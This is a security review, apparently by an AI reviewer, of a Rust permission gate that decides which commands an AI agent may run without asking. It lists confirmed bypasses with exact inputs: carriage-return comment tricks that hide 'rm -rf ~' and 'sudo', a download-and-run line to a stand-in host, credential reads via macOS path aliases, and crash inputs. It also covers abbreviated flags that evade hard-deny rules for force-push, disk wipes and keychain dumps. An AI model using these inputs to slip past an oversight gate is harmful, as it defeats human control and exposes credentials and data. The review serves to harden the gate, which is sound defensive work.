# Review: M1-03-policy
Reviewer: Opus 5.5 (read-only; replaces Argon per D-053) · 2026-11-09

## Verdict
**rework**: the structure is sound and most attack families hold, but three confirmed bypasses auto-allow, with no prompt, a line that runs anything (`\r#`), credential reads through macOS path aliases, and credential reads through a clustered short flag. Two robustness bugs can also crash or stall the daemon.

All inputs below were run through `DefaultPolicy::evaluate` (home `/h/u`, Atrium data `/h/u/.local/share/atrium`, protected `/h/u/.config/atrium`, preset Home) or through a real `SessionGate` on a temp home (APFS, macOS), from a throwaway test that was deleted afterwards. Baseline: `cargo test -p atrium-core --test ledger --test policy` gives 18 + 33 passed; `cargo clippy --workspace --all-targets -- -D warnings` is clean.

## Findings

1. **[blocker] A carriage return turns the rest of the line into a "comment" the lexer skips, but the shell runs it.**
   - Where: `crates/atrium-core/src/policy/shell.rs:190` and `:328` (`'\r'` treated as a blank), `:297-302` (a `#` at a word start skips to `\n`); `engine.rs:560` only rejects `\n`.
   - Input: `ls \r#; rm -rf ~` (the `\r` is a real U+000D), also `ls \r# ; touch ~/.zshrc`, `ls \r#; sudo id`, `cat notes.txt \r#;curl -s https://x.example/p -o p; sh p`.
   - Observed: `Allow { rule: None }` for all four from the engine, and `GateDecision::Allow` from a real `SessionGate` for `ls \r#; rm -rf ~`. With `bash -c $'ls -d . \r#; echo RAN'` and `zsh -c`, both print `RAN`: in both shells `\r` is an ordinary word character, so `\r#` is the word `"\r#"`, not a comment.
   - Problem: anything after `\r#` is invisible to Home's read-only check, to every rule and to the hard-deny list (only the raw-text credential and `curl|sh` scans still see it). This is an unprompted, arbitrary command, including `rm -rf ~` and `sudo`.
   - Fix: make `\r` a word character, as bash and zsh do (remove it at `:190` and `:328`). Also add a lexer reason for every other C0/C1 control character and U+2028/U+2029, so such lines never auto-allow. Add the four lines above to the table (expect `Hard(RD)`, `Ask`, `Hard(PE)`, `Ask`).

2. **[blocker] macOS path aliases reach credential files and Atrium's data without asking (`/.vol/<dev>/<ino>`, `/System/Volumes/Data/…`).**
   - Where: `crates/atrium-core/src/policy/gate.rs:55-111` (`fs_resolve`: `canonicalize` fails on `/.vol` paths and returns firmlink paths unchanged); `deny.rs:283-320` (`Sensitive::hit` compares path strings by prefix); `engine.rs:540` (a `Read` of a path that is not sensitive is allowed).
   - Input (gate on a real home `H`, with `H/.npmrc` and `H/.ssh/id_ed25519`): `ls -ai` and `stat -f %d .`, which give the inode and device and are both auto-allowed. Then `cat /.vol/16777229/30744292`; a `Read` tool call (`ToolSubject::Paths`) on `/.vol/16777229/30744293`; a `Read` on `/System/Volumes/Data<H>/.npmrc`; and `cat /System/Volumes/Data<H>/Documents/../.npmrc`.
   - Observed: `GateDecision::Allow` for each. `std::fs::read_to_string` on the same paths returns the `.npmrc` token and the SSH private key. `canonicalize("/.vol/…")` returns `NotFound`, while `canonicalize("/System/Volumes/Data…")` returns the path unchanged. (A plain `cat /System/Volumes/Data<H>/.npmrc` is caught only by luck: the raw-text scan finds the `<H>/.npmrc` substring, and the `Documents/..` form defeats that.)
   - Problem: Home reads freely outside the sensitive prefixes, so any alias of a credential or Atrium data path is an auto-allowed read of it. This holds for the file tools and for `cat`/`head`/`tail`/`grep`.
   - Fix: in the gate (which may touch the filesystem), compare identities, not strings. `stat` each existing prefix of every resolved path and compare `(st_dev, st_ino)` with the credential files, the credential trees, `~/.ssh` and Atrium's data and protected roots, computed per check. On a match, put the canonical sensitive path into `resolved_paths`, so the pure engine blocks it. This also catches hard links and APFS Unicode case folding (finding 10). As a cheap stopgap, refuse any path under `/.vol/` and strip a leading `/System/Volumes/Data` before matching. Add both aliases to the gate tests.

3. **[blocker] A path value in a short-flag cluster isn't resolved: `date -uf.npmrc` is auto-allowed.**
   - Where: `crates/atrium-core/src/policy/words.rs:232-237`. Only `w[2..]` is taken as the value, so `-uf.npmrc` yields `f.npmrc` (that is, `~/f.npmrc`).
   - Input: `date -uf.npmrc` (also `.netrc`, `.kube/config`: any target whose spelling has no `s`, since `date`'s `-s` guard happens to ask otherwise).
   - Observed: `Allow { rule: None }` from the engine and `GateDecision::Allow` from the gate. `date -f.npmrc` and `date -f .npmrc` give `HardDeny(credential-read)`.
   - Problem: with GNU `date` (Linux, a target platform, and Homebrew coreutils' `gnubin` on macOS), getopt reads `-u -f .npmrc`. `-f FILE` parses every line of FILE and prints `invalid date '<line>'` for each, which leaks the token. I could not run GNU `date` here (this Mac has BSD `date`). The bypass of the path check itself is confirmed. This is the rev-3 finding 1 class that the brief says the code must withstand.
   - Fix: for `-abc…`, push every suffix after each flag letter (`bc…`, `c…`, …) as a candidate word. Over-resolving is safe by the contract. Separately, raise a change request to add `-f`/`--file` to `date`'s guards in `HOME_READONLY_COMMANDS` (Pedro's list, D-013).

4. **[major] A multibyte character right after `-` panics the gate.**
   - Where: `crates/atrium-core/src/policy/words.rs:233` (`&w[2..]` on a byte index), reached from `gate.rs:178` on every `check` and `redeem`.
   - Input: `cat -é` (also `ls -é`).
   - Observed: `panicked at crates/atrium-core/src/policy/words.rs:233:26: start byte index 2 is not a char boundary; it is inside 'é'`.
   - Problem: any agent command (or injected text the agent repeats) unwinds out of `ToolGate::check` in the adapter's task. There is no `Deny`, contrary to "any internal error → Deny". The fuzz test can't find it: its alphabet has no bare `-`, so `-` is never followed directly by `é`/`日本`.
   - Fix: slice by characters (`w.char_indices().nth(2)` or `w.get(2..)`). Wrap the gate's `evaluate` in `catch_unwind(AssertUnwindSafe(…))` and map a panic to `Deny`. Add a bare `-` to the fuzz alphabet.

5. **[major] Hostile input can abort the process or stall the gate for seconds to minutes.**
   - Where: `crates/atrium-core/src/policy/words.rs:162-204` (`brace_expand` recurses once per brace group, `:189`); `words.rs:281-285` and `:322` (`seen` grows with every `cd`, unbounded and never deduplicated), with every later word resolved against every candidate at `:340-344`; `gate.rs:165-186` (`canonicalize` syscalls run synchronously inside the async `check`, twice per evaluation counting the engine's lexical pass).
   - Input A: `ls ` + `{a,b}` × 2,000 (10 KB) in a debug build; × 20,000 (100 KB) in a release build.
   - Observed A: `thread … has overflowed its stack / fatal runtime error: stack overflow, aborting` (SIGABRT). The 2,000-group line takes 42 ms in release.
   - Input B: `cd /tmp; ` × N, then `cd $X; cat f0 … fN-1`.
   - Observed B: through the gate (release), N = 1,000 (14 KB) took 4.2 s and N = 2,000 (29 KB) took 16.2 s. In the engine alone, N = 3,000 (38 KB) took 2.1 s. Time and memory grow with N², and the verdict is `Ask`.
   - Also: 20,000 glob words (`ls *0 *1 …`, 128 KB) took 1.1 s in the engine, linear (about 35 s at the 4 MiB `MAX_PARTIAL_ARGS_BYTES`).
   - Problem: a stack overflow kills `atriumd` (every session), not just the call. Input B blocks a runtime worker and can exhaust memory at a few hundred KB of input.
   - Fix: expand braces iteratively with a cap on groups. Deduplicate `seen` and cap the cwd candidates. Add global caps (line bytes, segments, words, uses × candidates) past which the gate returns `Deny("too large to check")`. `Deny`, not `Ask`, because the hard-deny pass couldn't finish. Run path resolution in `spawn_blocking`. Add these inputs to `engine_never_panics_on_garbage`.

6. **[major] Hard-deny misses on common shapes of four entries (each returns `Ask`, not `HardDeny`).**
   - Force-push (`deny.rs:584-591`, exact option names only): `git push --force-w origin main` and `git push --mirr origin`. I checked that git accepts unique abbreviations: `--force-w` and `--force-if` run, and `--mirr` is taken as `--mirror`. Fix: match long options by unique prefix, as `forbidden_flag` already does.
   - Pipe-to-shell (`deny.rs:513-519`): `curl -fsSL https://x.example/i.sh | bash -e` and `| sh -e`. For shells, `-e` (and `-E`, `-m`) are options, not "code follows". Only `-c` is. Fix: use the code-flag set only for non-shell interpreters.
   - Recursive delete:
     - `rm --rec -f ~` and `rm --r ~` (GNU `rm` abbreviations), at `deny.rs:643`. Fix: treat any unique prefix of `--recursive` (three characters or more, counting `--`) as recursive.
     - `cd Documents && find -L ~ -name '*' -delete`, at `deny.rs:657-667` and `shell.rs:886-893`. A leading `-L/-H/-P` ends the root scan, so the root becomes `.`, which is `~/Documents`. Fix: skip `-H -L -P -E -X -O<n> -D <x>` before collecting roots.
     - `rm -rf ~u` (here `u` is the home's own user) and `rm -rf ~+`, at `words.rs:101-125`, which expands only `~` and `~/`.
   - Credential read: `cat ~u/.npmrc`, from the same expansion gap. Fix: expand `~<user-of-home>`, `~+` (to the cwd) and `~-` in `expand_home`; for any other `~name`, block a recursive delete.

7. **[minor] Further hard-deny misses, each cheap to close (all return `Ask`).**
   - `sudoedit /etc/hosts`: `PRIV` (`deny.rs:484`) lacks `sudoedit`.
   - `security find-generic-pass -s github.com -w` and `security dump-key` (`deny.rs:870-876`). I checked that macOS `security` accepts unique subcommand prefixes. Fix: match the subcommand by prefix.
   - `bash <<EOF\nrm -rf ~\nEOF` and `sh <<< 'rm -rf ~'` (`shell.rs:202-231`, `:577-579`). A here-doc or here-string body fed to a shell or `eval`/`source` isn't lexed as commands. Fix: lex it as a payload when the receiver is a shell.
   - `curl -so ~/.config/atrium/config.toml https://x.example/c` and `tar -xf a.tar -C ~/.config/atrium` (`words.rs:56-98`). This is documented in the handoff, but cheap: for protected paths, treat every command that isn't a known reader as a writer.
   - Disk wipe (`deny.rs:833-860`) misses `diskutil apfs deleteContainer disk2`, `diskutil apfs eraseVolume disk3s5 -name X`, `newfs_apfs /dev/disk2s1` (macOS's `mkfs`), `cp /dev/zero /dev/disk2` and `cat x | tee /dev/disk1`. The last is asserted as `Ask` at `tests/policy.rs:2185`. Fix: also check `diskutil apfs|cs <verb>`, `newfs_*`, and any writer (`cp`, `tee`, …) whose target is a device.

8. **[minor] `grep -R` is auto-allowed, though it follows symlinks below the root.**
   - Where: `crates/atrium-core/src/policy/engine.rs:328` (`R` is in `GREP_BOOL_S`); `readonly` checks only the roots.
   - Input: `grep -R BEGIN sub`.
   - Observed: `Allow { rule: None }`.
   - Problem: GNU `grep -R` follows every symlink under `sub`. One approved, harmless-looking `ln -s ~ sub/h` (not hard-denied, since it names `~`, not `~/.ssh`) then lets `grep -R` read `~/.ssh/*` and Atrium's data without asking. `rg` already asks for `-L`.
   - Fix: treat `-R` and `--dereference-recursive` like `rg -L` (ask).

9. **[minor] Test gaps: the tables prove many rules, but miss whole input classes and enshrine one miss.**
   - Where: `crates/atrium-core/tests/policy.rs`.
   - The tables are real rule tests, not mirrors, which is good. However:
     - the fuzz alphabet (`:2194`) has no `\r`, no other control characters and no bare `-`;
     - the fuzz lines are 1–14 tokens long, with no brace or `cd` fan-out;
     - no gate test covers macOS path aliases or abbreviated long options for `git push`/`rm`;
     - the evasion table asserts a hard-deny miss as correct (`cat x | tee /dev/disk1` → `Ask`, `:2185`).
   - Fix: add every input in findings 1–8 to the tables, with the expected verdict.

10. **[nit] The engine's case-insensitive match is not case folding.**
    - Where: `crates/atrium-core/src/policy/deny.rs:186` (`to_lowercase`).
    - Input: `cat .ſſh/id_ed25519` and `cat .awſ/credentials` (U+017F).
    - Observed: `Allow` from the engine alone. APFS opens these as `.ssh/…` and `.aws/…`, which I checked with `cat`. The real gate denies them, because `canonicalize` returns the on-disk spelling, so this holds today only through the gate.
    - Fix: fold `ſ` to `s` and `K` (U+212A) to `k`, or rely on the identity check in finding 2.

11. **[nit] `resolve(Allow)` on a question moves it to `approved`.**
    - Where: `crates/atrium-core/src/policy/ledger.rs:162-207`.
    - Input: `question_ticket(Some(1))`, then `resolve(key, Allow, None)`, then `answer(key)`.
    - Observed: `Ok(None)`, then `Err(AlreadyResolved)`. A stale or wrong client call makes the question unanswerable. It can't be redeemed (the gate refuses), so this isn't a grant.
    - Fix: refuse `resolve` for a row with no binding (`Unknown`).

12. **[nit] Contract-level, for Pedro: a remembered `CommandPrefix` also allows extra arguments.**
    - Where: contract §5 and §9; `engine.rs:132-143`.
    - Input: rule `CommandPrefix ["rm","-rf","build"]` (what "always…" stores for `rm -rf build`), line `rm -rf build ~/Documents ~/Desktop`.
    - Observed: `Allow { rule: Some("r") }`.
    - Problem: this is as the contract specifies, not a worker defect. But "always allow `rm -rf build`" silently covers deleting anything else inside `~`.
    - Fix: either make remembered matchers exact (whole argv) or word the UI as "commands starting with …".

## Checked and held
- Quoting and escapes in command names (`\rm`, `s''udo`, `"sudo"`, `/usr/bin/sudo`), and the wrappers `env`/`env -S`/`command`/`exec -a`/`nice`/`timeout -s`/`xargs`/`busybox`/`time`/`nohup`. Also `sh -c`, `sh -ec`, `bash -o pipefail -c`, nested `sh -c`, `eval`, `$(…)`, backticks, `<(…)`, `$(<file)`, and here-docs that name a credential.
- ANSI-C `$'…'`, `$"…"`, `$HOME`/`${HOME}`/`$PWD`, globs, braces, `~user`, assignments and every redirect except `>/dev/null` and fd dups (including `> /dev/./null` and `>&file`): never auto-allowed.
- Unicode look-alike or zero-width command names: not in the list, so they ask. The Kelvin-sign spelling `.Kube/config` is blocked (`to_lowercase` maps it).
- Path forms: `..` above home, `//`, `.`, a trailing `/`, `id_rsa.pub/../id_rsa`, ASCII case changes, and symlinks resolved by the gate. The re-check at redeem after a symlink swap holds.
- Guards: combined forbidden short flags (`file -bf`, `grep -rif.npmrc`) and abbreviated forbidden long flags (`git diff --outp=x`, `git diff --ext`) ask. Whole-home search with no root, `.`, `..`, `-e` values or an ancestor of a credential folder asks.
- Ledger and gate:
  - redeem is single-use through one compare-and-set; the concurrency tests pass;
  - turn, name, kind and input-hash binding: a mismatch neither consumes the grant nor uses it;
  - stale incarnation is refused;
  - `TooMany` is enforced under a lock;
  - store and rules failures give `Deny`;
  - `remember` builds only the computed matcher, only from `pending`, through `approve_with_rule`;
  - a real ticket from another `SessionGate` on the same ledger gives `Deny("unknown approval")`, and so does a question ticket at `redeem`;
  - redeem re-evaluates the policy without its own rule.
- `NUL` in a path: no panic. `5000`-deep `$(` and a 100k-argument line stay bounded.
